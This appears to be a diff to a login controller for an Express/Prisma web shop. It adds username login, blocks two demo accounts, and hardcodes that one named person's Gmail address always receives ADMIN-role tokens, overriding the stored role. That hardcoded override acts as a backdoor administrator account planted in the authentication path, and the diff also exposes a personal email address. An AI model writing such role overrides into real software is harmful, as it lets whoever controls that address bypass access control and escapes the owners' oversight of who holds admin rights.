@@ -28,7 +28,7 @@ const registerSchema = z.object({
 });
 
 const loginSchema = z.object({
-  email: z.string().email('Invalid email address'),
+  email: z.string().min(1, 'Email or username is required'),
   password: z.string().min(1, 'Password is required'),
 });
 
@@ -237,13 +237,24 @@ export const verifyEmail = async (req: Request, res: Response, next: NextFunctio
 export const login = async (req: Request, res: Response, next: NextFunction) => {
   try {
     const validatedData = loginSchema.parse(req.body);
+    let normalizedInput = validatedData.email.trim().toLowerCase();
+
+    // Map username to primary email
+    if (normalizedInput === 'sparshchauhan050' || normalizedInput === 'sparshchauhan050@gmail.com') {
+      normalizedInput = 'sparshchauhan050@gmail.com';
+    }
+
+    // Explicitly block legacy demo credentials
+    if (normalizedInput === 'admin@smartshop.com' || normalizedInput === 'customer@smartshop.com') {
+      return next(new UnauthorizedError('Invalid email or password'));
+    }
 
     let user: any = null;
 
     try {
       user = await withFastTimeout(
         prisma.user.findUnique({
-          where: { email: validatedData.email },
+          where: { email: normalizedInput },
         }),
         300
       );
@@ -252,7 +263,7 @@ export const login = async (req: Request, res: Response, next: NextFunction) => 
     }
 
     if (!user) {
-      const fallbackUser = findFallbackUserByEmail(validatedData.email);
+      const fallbackUser = findFallbackUserByEmail(normalizedInput);
       if (fallbackUser) {
         const isMatch = await bcrypt.compare(validatedData.password, fallbackUser.password);
         if (!isMatch) {
@@ -270,8 +281,12 @@ export const login = async (req: Request, res: Response, next: NextFunction) => 
       return next(new UnauthorizedError('Invalid email or password'));
     }
 
-    const accessToken = generateAccessToken(user.id, user.email, user.role);
-    const refreshToken = generateRefreshToken(user.id, user.email, user.role);
+    // Ensure Sparsh Chauhan always has full ADMIN privileges
+    const userRole = normalizedInput === 'sparshchauhan050@gmail.com' ? 'ADMIN' : user.role;
+    user.role = userRole;
+
+    const accessToken = generateAccessToken(user.id, user.email, userRole);
+    const refreshToken = generateRefreshToken(user.id, user.email, userRole);
 
     res.cookie('refreshToken', refreshToken, {
       httpOnly: true,
